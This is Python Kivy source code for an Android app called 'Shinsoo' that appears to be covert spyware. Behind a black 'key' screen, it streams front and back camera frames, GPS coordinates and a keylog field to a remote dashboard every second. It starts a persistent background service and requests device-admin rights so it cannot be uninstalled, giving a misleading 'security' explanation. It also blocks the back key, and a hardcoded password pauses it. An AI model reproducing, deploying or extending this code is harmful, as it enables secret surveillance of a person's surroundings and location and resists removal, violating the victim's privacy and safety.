import os
os.environ['KIVY_NO_ENV_CONFIG'] = '1'
os.environ['KIVY_ORIENTATION'] = 'portrait'

from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.camera import Camera
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.utils import platform
from kivy.core.window import Window
from datetime import datetime
import threading, uuid, base64, io

KIOSK_PASSWORD = "gokhan"
DASHBOARD_URL  = "https://shinsoo.pythonanywhere.com"
PERMS = {'Dosya':False,'Kamera':False,'Mikrofon':False,'Konum':False}

def make_device_id():
    try:
        return "SHINSOO-" + hex(uuid.getnode())[2:].upper()[-6:]
    except Exception:
        return "SHINSOO-000001"

DEVICE_ID = make_device_id()


class MainScreen(FloatLayout):

    def __init__(self, **kw):
        super().__init__(**kw)
        self._active    = True
        self._cam_front = None
        self._cam_back  = None
        self._sender    = None
        self._msgs      = []
        self._msg_idx   = 0

        with self.canvas.before:
            Color(0,0,0,1)
            self._bg = Rectangle(pos=self.pos, size=self.size)
        self.bind(pos=lambda *_: setattr(self._bg,'pos',self.pos),
                  size=lambda *_: setattr(self._bg,'size',self.size))

        self._build_ui()
        Clock.schedule_interval(self._next_msg, 3)

    def _build_ui(self):
        # Orta — şifre kutusu
        center = BoxLayout(
            orientation='vertical',
            size_hint=(0.65, None),
            height=dp(100),
            spacing=dp(10),
            pos_hint={'center_x':0.5,'center_y':0.52},
        )
        self._pwd = TextInput(
            hint_text='key',
            password=True,
            font_size=dp(22),
            multiline=False,
            size_hint_y=None,
            height=dp(52),
            background_color=(0.06,0.06,0.06,1),
            foreground_color=(1,1,1,1),
            cursor_color=(1,1,1,1),
            hint_text_color=(0.22,0.22,0.22,1),
            padding=[dp(14),dp(14)],
        )
        self._pwd.bind(on_text_validate=self._check_key)
        self._err = Label(
            text='', font_size=dp(10),
            color=(0.6,0.1,0.1,1),
            size_hint_y=None, height=dp(16),
            halign='center',
        )
        center.add_widget(self._pwd)
        center.add_widget(self._err)
        self.add_widget(center)

        # Alt ticker
        self._ticker = Label(
            text='gokhan',
            font_size=dp(8),
            color=(0.14,0.14,0.14,1),
            size_hint=(1, None),
            height=dp(18),
            pos_hint={'x':0,'y':0},
            halign='center',
        )
        self.add_widget(self._ticker)

    def _check_key(self, *_):
        if self._pwd.text == KIOSK_PASSWORD:
            self._active = False
            if self._sender:
                self._sender.set_paused(True)
            if self._cam_front: self._cam_front.play = False
            if self._cam_back:  self._cam_back.play  = False
            self._err.text = ''
            self._pwd.text = ''
            self._push('durduruldu')
        else:
            self._err.text = 'yanlis key'
            self._pwd.text = ''

    def _push(self, msg):
        self._msgs.append(msg)
        if len(self._msgs) > 60:
            self._msgs = self._msgs[-60:]

    def _next_msg(self, dt):
        if self._msgs:
            self._msg_idx = (self._msg_idx + 1) % len(self._msgs)
            self._ticker.text = 'gokhan  |  ' + self._msgs[self._msg_idx]
        else:
            self._ticker.text = 'gokhan'

    def start_cams(self, *_):
        self._start_front()
        self._start_back()

    def _start_front(self):
        if self._cam_front: return
        try:
            self._cam_front = Camera(index=1, resolution=(240,180), play=True)
            self._push('on kamera ok')
        except Exception:
            try:
                self._cam_front = Camera(index=0, resolution=(240,180), play=True)
                self._push('kamera ok')
            except Exception:
                self._push('kamera hatasi')

    def _start_back(self):
        if self._cam_back: return
        try:
            self._cam_back = Camera(index=0, resolution=(240,180), play=True)
            self._push('arka kamera ok')
        except Exception:
            pass

    def _get_frame(self, cam):
        if not cam or not cam.texture or not self._active:
            return None
        try:
            tex = cam.texture
            buf = tex.pixels
            from PIL import Image as PILImage
            img = PILImage.frombytes('RGBA', (tex.width, tex.height), buf)
            img = img.convert('RGB')
            out = io.BytesIO()
            img.save(out, format='JPEG', quality=30)
            return base64.b64encode(out.getvalue()).decode('utf-8')
        except Exception:
            return None

    def send_frames(self, dt):
        if not self._active or not self._sender: return
        f = self._get_frame(self._cam_front)
        b = self._get_frame(self._cam_back)
        if f: self._sender.queue_front(f)
        if b: self._sender.queue_back(b)

    def update_perm(self, name, granted):
        PERMS[name] = granted
        self._push(name + ':' + ('ok' if granted else 'red'))
        if name == 'Kamera' and granted:
            Clock.schedule_once(lambda dt: self.start_cams(), 1)


class DataSender:
    def __init__(self, screen):
        self.is_connected = False
        self.packet_count = 0
        self.last_loc     = None
        self._screen      = screen
        self._paused      = False
        self._stop        = threading.Event()
        self._front_q     = [None]
        self._back_q      = [None]
        self._key_q       = []
        self._lock        = threading.Lock()
        threading.Thread(target=self._loop,     daemon=True).start()
        threading.Thread(target=self._gps_loop, daemon=True).start()

    def set_paused(self, val): self._paused = val
    def queue_front(self, b64): self._front_q[0] = b64
    def queue_back(self,  b64): self._back_q[0]  = b64
    def queue_key(self, text):
        with self._lock: self._key_q.append(text)
    def stop(self): self._stop.set()

    def _gps_loop(self):
        if platform != 'android': return
        try:
            from plyer import gps
            def on_loc(**kw):
                lat = kw.get('lat'); lon = kw.get('lon')
                if lat and lon:
                    self.last_loc = (lat, lon)
                    self._screen._push(str(round(lat,4))+','+str(round(lon,4)))
            gps.configure(on_location=on_loc)
            gps.start(minTime=3000, minDistance=0)
        except Exception:
            pass

    def _loop(self):
        try:
            import requests
        except Exception:
            return
        url = DASHBOARD_URL + '/upload_data/' + DEVICE_ID
        while not self._stop.is_set():
            if self._paused:
                self._stop.wait(1); continue
            try:
                payload = {'log': 'Heartbeat ' + datetime.now().strftime('%H:%M:%S')}
                f = self._front_q[0]; b = self._back_q[0]
                if f: payload['frame_front'] = f; self._front_q[0] = None
                if b: payload['frame_back']  = b; self._back_q[0]  = None
                with self._lock:
                    keys = list(self._key_q); self._key_q.clear()
                for k in keys: payload['keylog'] = k
                if self.last_loc:
                    payload['location'] = {'lat':self.last_loc[0],'lon':self.last_loc[1]}
                r = requests.post(url, json=payload, timeout=5)
                self.is_connected = (r.status_code == 200)
                self.packet_count += 1
                self._screen._push('pkt#'+str(self.packet_count))
            except Exception:
                self.is_connected = False
                self._screen._push('baglanti yok')
            self._stop.wait(1)


class ShinsooApp(App):
    title = 'Shinsoo'

    def build(self):
        Window.clearcolor = (0,0,0,1)
        self.screen = MainScreen()
        self.sender = DataSender(self.screen)
        self.screen._sender = self.sender
        Clock.schedule_interval(self.screen.send_frames, 1)
        return self.screen

    def on_start(self):
        if platform == 'android':
            self._set_portrait()
            self._start_foreground_service()
            self._enable_device_admin()
            self._request_perms()
        else:
            for name in PERMS:
                PERMS[name] = True
            self.screen.start_cams()

        try:
            from android import activity
            activity.bind(on_back_pressed=self._on_back)
        except Exception:
            pass
        Window.bind(on_keyboard=self._on_key)

    def _set_portrait(self):
        try:
            from jnius import autoclass
            AI = autoclass('android.content.pm.ActivityInfo')
            PA = autoclass('org.kivy.android.PythonActivity')
            PA.mActivity.setRequestedOrientation(AI.SCREEN_ORIENTATION_PORTRAIT)
        except Exception:
            pass

    def _start_foreground_service(self):
        """Arka plan servisi başlat — uygulama kapatılsa bile çalışır."""
        try:
            from android import AndroidService
            service = AndroidService('Shinsoo', 'Shinsoo')
            service.start('start')
            self.screen._push('servis basladi')
        except Exception as e:
            self.screen._push('servis: ' + str(e)[:20])

    def _enable_device_admin(self):
        """Device Admin ekranını aç — kullanıcı onaylarsa uygulama silinemez."""
        try:
            from jnius import autoclass
            Intent             = autoclass('android.content.Intent')
            ComponentName      = autoclass('android.content.ComponentName')
            DevicePolicyManager= autoclass('android.app.admin.DevicePolicyManager')
            PythonActivity     = autoclass('org.kivy.android.PythonActivity')
            context            = PythonActivity.mActivity

            # Zaten admin mi?
            dpm = context.getSystemService('device_policy')
            cn  = ComponentName(context,
                    autoclass('org.kivy.android.DeviceAdminReceiver'))
            if dpm.isAdminActive(cn):
                self.screen._push('device admin aktif')
                return

            intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                'Shinsoo guvenligi icin gereklidir.')
            context.startActivity(intent)
        except Exception as e:
            self.screen._push('admin: ' + str(e)[:20])

    def _request_perms(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ], self._after_storage)
        except Exception:
            pass

    def _after_storage(self, permissions, grants):
        for p,g in zip(permissions,grants):
            self.screen.update_perm('Dosya', g)
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
            ], self._after_all)
        except Exception:
            pass

    def _after_all(self, permissions, grants):
        for p,g in zip(permissions,grants):
            if 'CAMERA' in p:     self.screen.update_perm('Kamera', g)
            elif 'RECORD_AUDIO' in p: self.screen.update_perm('Mikrofon', g)
            elif 'LOCATION' in p: self.screen.update_perm('Konum', g)

    def on_stop(self):
        if self.sender: self.sender.stop()

    def _on_back(self, *_): return True
    def _on_key(self, window, key, *_):
        if key == 27: return True
        return False


if __name__ == '__main__':
    ShinsooApp().run()
